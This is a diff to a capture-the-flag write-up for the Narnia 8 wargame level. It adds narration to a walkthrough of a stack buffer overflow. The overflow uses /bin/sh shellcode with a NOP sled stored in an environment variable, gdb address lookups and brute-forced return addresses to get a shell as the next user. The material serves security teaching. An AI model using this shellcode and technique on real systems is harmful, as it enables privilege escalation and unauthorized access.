@@ -305,7 +305,10 @@ root@kali:~# export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31
 root@kali:~# ./getenvaddress EGG
 EGG found at ffffe74f
 >```
-```
+>
+> Man...let's stop right here. I spent a long time trying to get the correct address for our environment variable only to see access denied almost everywhere I went.  It turns out that the address can bounce around depending on what process you are in.  Therefore, looking up the correct address in the bash shell does not correlate to runtime with narnia8.  However, I was turned onto a ```gdb``` trick that is pretty nice.  Let's get back to the point where we are overwritting the ```ret```.
+>
+>```
 narnia8@melinda:/narnia$ export EGG=$(python -c 'print "\x90"*100+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
 narnia8@melinda:/narnia$ gdb narnia8
 (gdb) break * 0x080484a7
@@ -333,6 +336,11 @@ AAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAARRRR���
 >
 Program received signal SIGSEGV, Segmentation fault.
 0x52525252 in ?? ()
+>```
+>
+> Ok, there are a few things to point out here.  First off, you may have noticed that I added a bunch of ```nop``` values to the begining of the shellcode, don't worry about it for now as we will see where that will come in handy towards the end.  Finally, we see that we have hit our segmentation fault again on an address that we control.  The trick here is to use the ```x/s *((char **)environ)``` command in ```gdb``` to return the addresses of the environment variables.  This command can be iterated as ```x/s *((char **)environ)```, ```x/s *((char **)environ+1)```, ```x/s *((char **)environ+2)```, ect.  Once we locate our variable we can substitute the address in our payload and try to get our shell once again.
+>
+>```
 (gdb) run $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -368,8 +376,11 @@ process 5159 is executing new program: /bin/dash
 Warning:
 Cannot insert breakpoint 1.
 Cannot access memory at address 0x80484a7
-```
-```
+>```
+>
+> Perfect.  That makes me happy.  We can see that once we used the correct address we were successfully able to return to the shellcode and run it.  Now, here is gets a little tricky again.  As soon as we get out of ```gdb``` things are going to change on us again, only we won't have all of the fancy tools to help us locate the new address.  As of now, the best way I know to proceed is to brute force. Let's start with the address of ```argv[1]```.
+>
+>```
 narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x19\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
 AAAAAAAAAAAAAAAAAAAAA��
 narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1a\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
@@ -399,8 +410,11 @@ AAAAAAAAAAAAAAAAAAAA%%��
 narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
 AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
 Segmentation fault
-```
-```
+>```
+>
+> Ok, that wasn't as painful as it could have been I guess.  Here's where those ```nop``` values come in.  The second address that we need to brute force is the actual environment variable address.  By adding those to the begining of our shellcode we have effectively increased the address space that we can land and still successfully execute the shell.  Let's start guessing...
+>
+>```
 narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xba\xd8\xff\xff"')
 AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
 Segmentation fault
@@ -410,4 +424,6 @@ $ whoami
 narnia9
 $ cat /etc/narnia_pass/narnia9
 **********
-```
+>```
+>
+> Well that was much easier than the first address and finally we have completed it.  This ends the narnia series.  Up next.....Behemoth!
